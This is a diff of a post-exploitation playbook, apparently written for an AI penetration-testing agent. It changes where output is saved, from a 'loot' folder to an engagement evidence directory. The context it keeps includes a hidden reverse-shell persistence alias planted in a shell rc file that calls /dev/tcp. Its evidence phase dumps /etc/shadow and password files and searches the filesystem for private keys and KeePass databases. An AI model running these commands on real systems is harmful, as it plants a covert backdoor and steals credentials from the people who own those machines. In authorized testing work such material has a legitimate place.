@@ -37,7 +37,7 @@ Post-exploitation generates the most valuable evidence for the report. **Documen
 - Files/data discovered
 - Persistence mechanisms planted
 
-Save to `loot/post-<target>-<date>.md`
+Save to `engagements/<target>/post-exploit/` following the workspace engagement structure. The orchestrator will specify the target name. NEVER create ad-hoc directories.
 
 ## Phase 1 — Recon Your Position
 
@@ -264,26 +264,29 @@ echo 'alias ls="ls; /tmp/.bash_hidden -i >& /dev/tcp/<IP>/<PORT> 0>&1"' >> ~/.ba
 ## Phase 6 — Evidence Gathering
 
 ```bash
+# Create evidence directory in engagement structure
+mkdir -p engagements/<target>/post-exploit/evidence/
+
 # System info
-uname -a > loot/system_info.txt
-cat /etc/os-release >> loot/system_info.txt
-ip addr >> loot/network_info.txt
-ps aux >> loot/processes.txt
+uname -a > engagements/<target>/post-exploit/evidence/system_info.txt
+cat /etc/os-release >> engagements/<target>/post-exploit/evidence/system_info.txt
+ip addr >> engagements/<target>/post-exploit/evidence/network_info.txt
+ps aux >> engagements/<target>/post-exploit/evidence/processes.txt
 
 # User accounts
-cat /etc/passwd > loot/passwd.txt
-cat /etc/shadow > loot/shadow.txt 2>/dev/null
+cat /etc/passwd > engagements/<target>/post-exploit/evidence/passwd.txt
+cat /etc/shadow > engagements/<target>/post-exploit/evidence/shadow.txt 2>/dev/null
 
 # Network connections
-netstat -tulpn > loot/connections.txt
-ss -tulpn >> loot/connections.txt
+netstat -tulpn > engagements/<target>/post-exploit/evidence/connections.txt
+ss -tulpn >> engagements/<target>/post-exploit/evidence/connections.txt
 
 # File discovery
-find / -name "*.doc" -o -name "*.pdf" -o -name "*.kdbx" 2>/dev/null > loot/interesting_files.txt
-find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null > loot/keys.txt
+find / -name "*.doc" -o -name "*.pdf" -o -name "*.kdbx" 2>/dev/null > engagements/<target>/post-exploit/evidence/interesting_files.txt
+find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null > engagements/<target>/post-exploit/evidence/keys.txt
 
 # Screenshots (if GUI)
-import -window root loot/screenshot.png
+import -window root engagements/<target>/post-exploit/evidence/screenshot.png
 ```
 
 ## Cleanup
